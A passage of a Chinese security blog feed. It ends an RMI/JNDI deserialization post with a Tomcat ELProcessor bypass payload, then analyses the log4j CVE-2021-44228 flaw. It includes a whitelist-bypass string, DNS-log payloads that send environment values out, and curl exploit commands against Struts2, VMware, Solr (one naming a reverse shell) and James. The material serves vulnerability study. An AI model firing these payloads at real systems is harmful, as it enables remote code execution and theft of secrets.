class="line">                    &#125;</span><br><span class="line">                    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                        forced.put(param,</span><br><span class="line">                                   beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">                    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                ra = e.nextElement();</span><br><span class="line">                String propName = ra.getType();</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                    propName.equals(<span class="hljs-string">"scope"</span>) || propName.equals(<span class="hljs-string">"auth"</span>) ||</span><br><span class="line">                    propName.equals(<span class="hljs-string">"forceString"</span>) ||</span><br><span class="line">                    propName.equals(<span class="hljs-string">"singleton"</span>)) &#123;</span><br><span class="line">                    <span class="hljs-keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">                Object[] valueArray = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">                Method method = forced.get(propName);</span><br><span class="line">                <span class="hljs-keyword">if</span> (method != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                    valueArray[<span class="hljs-number">0</span>] = value;</span><br><span class="line">                    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                        method.invoke(bean, valueArray);</span><br><span class="line">                    &#125; <span class="hljs-keyword">catch</span> (...) &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="hljs-keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">return</span> bean;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (java.beans.IntrospectionException ie) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合以上<code>getObjectInstance</code>代码逻辑，被反射的类需要符合以下条件才可被利用:</p><ul><li>具有一个无参公有构造方法</li><li>具有一个公有、参数为String类型的方法</li></ul><p>一些使用了<code>tomcat-embed-el</code>依赖的项目，或者部分tomcat和spring的版本下具有的<code>javax.el.ELProcessor</code>类和他的<code>eval</code>方法符合这些条件，最终构造出用于绑定的Remote对象如下：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef resourceRef = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">"javax.el.ELProcessor"</span>, (String) <span class="hljs-keyword">null</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-keyword">true</span>, <span class="hljs-string">"org.apache.naming.factory.BeanFactory"</span>, (String) <span class="hljs-keyword">null</span>);</span><br><span class="line">resourceRef.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">"forceString"</span>, <span class="hljs-string">"a=eval"</span>));</span><br><span class="line">resourceRef.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">"a"</span>, <span class="hljs-string">"Runtime.getRuntime().exec(\"calc\")"</span>));</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(resourceRef);</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ</a></p><p><a href="https://su18.org/post/rmi-attack/" target="_blank" rel="noopener">https://su18.org/post/rmi-attack/</a></p><p><a href="http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://xz.aliyun.com/t/7932" target="_blank" rel="noopener">https://xz.aliyun.com/t/7932</a></p><p><a href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1</a></p><p><a href="https://www.anquanke.com/post/id/263726" target="_blank" rel="noopener">https://www.anquanke.com/post/id/263726</a></p><p><a href="https://tttang.com/archive/1405/" target="_blank" rel="noopener">https://tttang.com/archive/1405/</a></p><p><a href="https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;RMI简介&quot;&gt;&lt;a href=&quot;#RMI简介&quot; class=&quot;headerlink&quot; title=&quot;RMI简介&quot;&gt;&lt;/a&gt;RMI简介&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Java远程方法调用&lt;/strong&gt;，即&lt;strong&gt;Java RMI&lt;/strong&gt;（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。它是由注册中心、服务端和客户端三部分组成。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;注册中心&lt;/p&gt;
&lt;p&gt;作为存储远程方法的代理对象的仓库。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;服务端&lt;/p&gt;
&lt;p&gt;暴露远程对象，并将其代理对象注册进 RMI Registry。一个代理对象在服务端中包含一个skeleton对象，用于接受来自stub对象的调用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;客户端&lt;/p&gt;
&lt;p&gt;查找远程代理对象，远程调用服务对象。一个代理对象在调用该远程对象的客户端上包含一个stub对象，负责调用参数和返回值的序列化、打包解包，以及网络层的通讯过程。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
    <category term="RMI" scheme="http://127.0.0.1/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>log4j漏洞分析</title>
    <link href="http://127.0.0.1/2021/12/16/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://127.0.0.1/2021/12/16/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-12-16T12:09:53.000Z</published>
    <updated>2022-02-16T12:42:10.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2021 年 12 月 10 日，Apache发布了其 Log4j 框架的 2.15.0 版，其中包括对 CVE-2021-44228 的修复，这是一个影响 Apache Log4j 2.14.1 及更早版本的关键 (CVSSv3 10) 远程代码执行 (RCE) 漏洞。该漏洞存在于 Log4j 处理器处理特制日志消息的方式中。不可信的字符串（例如，来自输入文本字段的字符串，例如 Web 应用程序搜索框）包含的内容<code>${jndi:ldap://example.com/a}</code>，如果启用了消息查找替换，将触发远程类加载、消息查找和相关内容的执行。成功利用 CVE-2021-44228 可以让未经身份验证的远程攻击者完全控制易受攻击的目标系统。</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。</p><p>Lookup提供了一种在任意位置向 Log4j 配置添加值的方法。它们是实现<code>StrLookup</code>接口的特定类型的插件。Lookup语法为<code>${prefix:name}</code>，其中前缀标识告诉Log4j应在特定上下文中使用的变量名称。</p><table><thead><tr><th>前缀</th><th>上下文</th></tr></thead><tbody><tr><td>bundle</td><td>资源束。格式为bundle:BundleName:BundleKey。捆绑包名称遵循包命名约定，如： {bundle:com.domain.Messages:MyKey}。</td></tr><tr><td>ctx</td><td>线程上下文映射（MDC）。</td></tr><tr><td>date</td><td>使用指定的格式插入当前日期和/或时间。</td></tr><tr><td>env</td><td>系统环境变量。</td></tr><tr><td>jndi</td><td>在默认的JNDI上下文中设置的值。</td></tr><tr><td>jvmrunargs</td><td>通过JMX访问的JVM输入参数，但不是主要参数; 请参阅<a href="http://docs.oracle.com/javase/6/docs/api/java/lang/management/RuntimeMXBean.html#getInputArguments--" target="_blank" rel="noopener">RuntimeMXBean.getInputArguments</a>在Android上不可用</td></tr><tr><td>log4j</td><td>Log4j配置属性。表达式<code>log4j:configLocation</code>和<code>log4j:configLocation</code>和<code>{log4j:configParentLocation}</code>分别提供给log4j的配置文件和它的父文件夹的绝对路径。</td></tr><tr><td>main</td><td>使用 MapLookup.setMainArguments(String[])设置的值。</td></tr><tr><td>map</td><td>来自MapMessage的值。</td></tr><tr><td>sd</td><td>来自StructuredDataMessage的值。“id”将返回没有企业号的StructuredDataId的名称。“type”将返回消息类型。其他键将从Map中取回单个元素。</td></tr><tr><td>sys</td><td>系统属性。</td></tr></tbody></table><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>选用log4j-core 2.14.1版本，使用以下代码作为demo。启动一个恶意的RMI或LDAP服务，执行demo即可触发。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log4jJNDI</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger logger = LogManager.getLogger(Log4jJNDI.class);</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="hljs-string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="hljs-string">"true"</span>);</span><br><span class="line">        System.setProperty(<span class="hljs-string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>, <span class="hljs-string">"true"</span>);</span><br><span class="line">        logger.error(<span class="hljs-string">"$&#123;jndi:rmi://127.0.0.1:8888/Calc&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 172549.png" alt></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>跟进到<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>，若未设置<code>nolookup</code>为true，遍历要输出的日志，<code>$</code>符号和<code>{</code>符号相继出现则会在后续将花括号中的内容作处理。<code>nolookup</code>在log4j 2.15.0之前是默认关闭的。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 173650.png" alt></p><p>再跟进到<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute</code>，在这里会从外到内递归<code>${</code>和<code>}</code>内的内容，然后使用通了中的<code>resolveVariable</code>方法解析并返回它的值。</p><p>在<code>resolveVariable</code>方法里支持解析的前缀有<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，实测在Spring框架下支持解析的前缀会有所不同。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 192736.png" alt></p><p>继续跟进<code>org.apache.logging.log4j.core.lookup.Interpolator#lookup</code>，根据前缀从<code>strLookupMap</code>属性中获取相应的Lookup类实例。这里获取的是<code>JndiLookup</code>的实例，并调用该实例的<code>lookup</code>方法。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 194201.png" alt></p><p><code>JndiLookup</code>的<code>lookup</code>方法里，调用<code>org.apache.logging.log4j.core.net.jndiManager</code>的<code>getDefaultManager</code>静态方法，返回<code>JndiManager</code>实例，其中的<code>context</code>属性被设置为<code>InitialContext</code>对象。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 195829.png" alt></p><p>然后调用<code>JndiManager</code>实例的<code>lookup</code>方法，实际就是它的<code>context</code>属性<code>InitialContext</code>的<code>lookup</code>方法，后续流程就如常规JNDI注入，加载远程的恶意类执行其中的恶意代码。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 200606.png" alt></p><h2 id="RC1修复绕过"><a href="#RC1修复绕过" class="headerlink" title="RC1修复绕过"></a>RC1修复绕过</h2><p>log4j在RC1中对JNDI注入问题的修复存在于github的commit记录<a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3" target="_blank" rel="noopener">LOG4J2-3201</a>中。在<code>JndiManager</code>类里对反序列化的类和JNDI服务器地址做了白名单校验。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">           URI uri = <span class="hljs-keyword">new</span> URI(name);</span><br><span class="line">           <span class="hljs-keyword">if</span> (uri.getScheme() != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">               <span class="hljs-keyword">if</span> (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                   LOGGER.warn(<span class="hljs-string">"Log4j JNDI does not allow protocol &#123;&#125;"</span>, uri.getScheme());</span><br><span class="line">                   <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="hljs-keyword">if</span> (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) &#123;</span><br><span class="line">                   <span class="hljs-keyword">if</span> (!allowedHosts.contains(uri.getHost())) &#123;</span><br><span class="line">                       LOGGER.warn(<span class="hljs-string">"Attempt to access ldap server not in allowed list"</span>);</span><br><span class="line">                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   Attributes attributes = <span class="hljs-keyword">this</span>.context.getAttributes(name);</span><br><span class="line">                   <span class="hljs-keyword">if</span> (attributes != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                       <span class="hljs-comment">// In testing the "key" for attributes seems to be lowercase while the attribute id is</span></span><br><span class="line">                       <span class="hljs-comment">// camelcase, but that may just be true for the test LDAP used here. This copies the Attributes</span></span><br><span class="line">                       <span class="hljs-comment">// to a Map ignoring the "key" and using the Attribute's id as the key in the Map so it matches</span></span><br><span class="line">                       <span class="hljs-comment">// the Java schema.</span></span><br><span class="line">                       Map&lt;String, Attribute&gt; attributeMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">                       NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll();</span><br><span class="line">                       <span class="hljs-keyword">while</span> (enumeration.hasMore()) &#123;</span><br><span class="line">                           Attribute attribute = enumeration.next();</span><br><span class="line">                           attributeMap.put(attribute.getID(), attribute);</span><br><span class="line">                       &#125;</span><br><span class="line">                       Attribute classNameAttr = attributeMap.get(CLASS_NAME);</span><br><span class="line">                       <span class="hljs-keyword">if</span> (attributeMap.get(SERIALIZED_DATA) != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                           <span class="hljs-keyword">if</span> (classNameAttr != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                               String className = classNameAttr.get().toString();</span><br><span class="line">                               <span class="hljs-keyword">if</span> (!allowedClasses.contains(className)) &#123;</span><br><span class="line">                                   LOGGER.warn(<span class="hljs-string">"Deserialization of &#123;&#125; is not allowed"</span>, className);</span><br><span class="line">                                   <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                               &#125;</span><br><span class="line">                           &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                               LOGGER.warn(<span class="hljs-string">"No class name provided for &#123;&#125;"</span>, name);</span><br><span class="line">                               <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attributeMap.get(REFERENCE_ADDRESS) != <span class="hljs-keyword">null</span></span><br><span class="line">                               || attributeMap.get(OBJECT_FACTORY) != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                           LOGGER.warn(<span class="hljs-string">"Referenceable class is not allowed for &#123;&#125;"</span>, name);</span><br><span class="line">                           <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="hljs-keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">           <span class="hljs-comment">// This is OK.</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">this</span>.context.lookup(name);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>但这个修复存在问题，如果<code>new URI(name)</code>抛出了<code>URISyntaxException</code>异常，则会跳过白名单校验直接调用<code>lookup</code>。URI加不编码的空格可以触发<code>URISyntaxException</code>跳出<code>try catch</code>直接执行lookup，但在<code>lookup</code>里会去掉空格，正常触发JNDI注入。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</span><br></pre></td></tr></table></figure><h2 id="其他利用方式"><a href="#其他利用方式" class="headerlink" title="其他利用方式"></a>其他利用方式</h2><h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h3><p>log4j中的两个前缀<code>sys</code>和<code>env</code>，是分别通过<code>System.getProperty()</code>和<code>System.getenv()</code>实现的，能够获取环境变量和系统属性，再配合<code>Out-of-Band</code>，就能读取到环境变量和系统属性中的敏感信息。</p><p>POC</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:USER&#125;.dnslog.cn/abc&#125;</span><br></pre></td></tr></table></figure><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>bundle前缀<code>ResourceBundleLookup</code>中会把 key 按照 <code>:</code>分割成两份，第一个是 bundleName 获取 ResourceBundle，第二个是 bundleKey 获取 Properties Value。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 113526.png" alt></p><p>bundle前缀在只引入log4j的项目上默认不支持，测试在spring框架里支持。</p><p>POC</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;bundle:bundleName:bundleKey&#125;.ed7yce.dnslog.cn/abc&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 120301.png" alt></p><h2 id="受影响组件触发方式"><a href="#受影响组件触发方式" class="headerlink" title="受影响组件触发方式"></a>受影响组件触发方式</h2><h3 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h3><ul><li><p>检查请求路径触发</p><p>在struts2-core包的<code>org.apache.struts2.dispatcher.mapper#cleanupActionName</code>中，检查action名的范围是否在<code>[a-zA-Z0-9._!/\-]</code>内，若存在访问之外的字符，则会将action名输出到WARN日志中。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> String <span class="hljs-title">cleanupActionName</span><span class="hljs-params">(String rawActionName)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.allowedActionNames.matcher(rawActionName).matches()) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> rawActionName;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        LOG.warn(<span class="hljs-string">"&#123;&#125; did not match allowed action names &#123;&#125; - default action &#123;&#125; will be used!"</span>, rawActionName, <span class="hljs-keyword">this</span>.allowedActionNames, <span class="hljs-keyword">this</span>.defaultActionName);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.defaultActionName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在请求路径中两个相邻的<code>/</code>会被转换为一个<code>/</code>，将其中一个<code>/</code>替换为<code>${::-/}</code>可防止被转换。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 163347.png" alt="屏幕截图 2021-12-15 163347"></p><p>有的struts2版本的相同类中还存在<code>cleanupNamespaceName</code>方法，利用方式相同。</p><p>POC</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/</span><br></pre></td></tr></table></figure></li><li><p>检查请求参数长度</p><p>在struts2-core包的<code>com.opensymphony.xwork2.interceptor#isWithinLengthLimit</code>中，访问一个存在的action，会检查请求参数名的长度，若长度超过默认的100个字符，请求参数名则会输出到debug日志中。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isWithinLengthLimit</span><span class="hljs-params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">boolean</span> matchLength = name.length() &lt;= <span class="hljs-keyword">this</span>.paramNameMaxLength;</span><br><span class="line">    <span class="hljs-keyword">if</span> (!matchLength) &#123;</span><br><span class="line">        LOG.debug(<span class="hljs-string">"Parameter [&#123;&#125;] is too long, allowed length is [&#123;&#125;]"</span>, name, String.valueOf(<span class="hljs-keyword">this</span>.paramNameMaxLength));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> matchLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123</span><br></pre></td></tr></table></figure></li><li><p>获取静态文件If-Modified-Since头</p><p>struts2在<code>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter#doFilter</code>拦截一个请求，且请求的路径不在排除的路径内，则会先调用<code>execute</code>属性的<code>executeStaticResourceRequest</code>方法，判断是否为静态文件。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 102729.png" alt></p><p>在<code>org.apache.struts2.dispatcher.ExecuteOperations#executeStaticResourceRequest</code>里，请求以<code>struts</code>或<code>static</code>开头则会交给<code>DefaultStaticContentLoader</code>的<code>findStaticResource</code>处理。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 103413.png" alt></p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 103622.png" alt></p><p><code>findStaticResource</code>方法中，静态文件会从struts2 core的<code>org.apache.struts.static</code>包下找，然后会交给同类的<code>process</code>方法处理。该包存在以下静态文件。</p><blockquote><p>tooltip.gif</p><p>domtt.css</p><p>utils.js</p><p>domTT.js</p><p>inputtransfersselect.js</p><p>optiontransferselect.js</p></blockquote><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 104446.png" alt></p><p><code>process</code>方法里，静态文件输入流非空时，则会尝试将请求头<code>If-Modified-Since</code>的值转为Date类型，当转换失败抛出异常，<code>If-Modified-Since</code>的值就会输出到WARN日志中。</p><p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 105724.png" alt></p><p>我们访问struts2中默认的静态文件，并设置<code>If-Modified-Since</code>头为非Date类型即可触发log4j漏洞。</p><p>POC</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -H &quot;If-Modified-Since: \$&#123;jndi:rmi:\$&#123;::-/&#125;/localhost:8888/Calc&#125;&quot; http://192.168.217.1:8080/helloworld_war/struts/utils.js</span><br></pre></td></tr></table></figure></li></ul><h3 id="vmware"><a href="#vmware" class="headerlink" title="vmware"></a>vmware</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --insecure  -vv -H &quot;X-Forwarded-For: \$&#123;jndi:ldap://10.0.0.3:1270/lol&#125;&quot; &quot;https://10.0.0.4/websso/SAML2/SSO/photon-machine.lan?SAMLRequest=&quot;</span><br></pre></td></tr></table></figure><h3 id="slor"><a href="#slor" class="headerlink" title="slor"></a>slor</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://localhost:8983/solr/admin/collections?action=$&#123;jndi:ldap://xxx/Basic/ReverseShell/ip/9999&#125;&amp;wt=json&apos;</span><br><span class="line">curl &apos;http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json&apos;</span><br></pre></td></tr></table></figure><h3 id="James"><a href="#James" class="headerlink" title="James"></a>James</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 233 &gt; email.txt</span><br><span class="line">curl --url &quot;smtp://localhost&quot; --user &quot;test:test&quot; --mail-from &apos;$&#123;jndi:ldap://localhost:1270/abc&#125;@gmail.com&apos; --mail-rcpt &apos;test&apos; --upload-file email.txt</span><br></pre></td></tr></table></figure><h3 id="Druid"><a href="#Druid" class="headerlink" 